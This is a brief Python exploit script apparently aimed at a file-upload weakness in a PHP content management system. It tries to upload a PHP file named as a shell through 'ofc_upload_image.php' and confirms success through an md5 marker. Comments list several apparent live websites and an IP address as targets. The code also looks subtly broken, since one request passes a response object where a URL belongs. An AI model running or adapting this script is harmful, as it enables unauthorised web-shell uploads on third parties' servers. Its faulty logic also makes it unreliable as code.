# coding:utf-8
import random
import re
import requests

class Exploit:

    def attack(self, url):
        fileName = "shell" + str(random.randrange(1000, 9999)) + ".php"
        target = url + '/dayrui/libraries/Chart/ofc_upload_image.php?name=' + fileName

        req = requests.get(target, headers={"Content-Type": "application/oct"})
        res = requests.get(req, data="<?print(md5(0x22))?>").text

        url = url + '/dayrui/libraries/tmp-upload-images/' + fileName
        if re.search(r'tmp-upload-images', res):
            res = requests.get(url).text
            if re.search(r'e369853df766fa44e1ed0ff613f563bd', res):
                return "[Upload Success] {}".format(url)

# http://njaykf.org
# http://www.xzeca.org.cn/
# http://www.gslzzx.gov.cn
# http://182.140.235.82
# print Exploit().attack("http://www.wfeng.net/")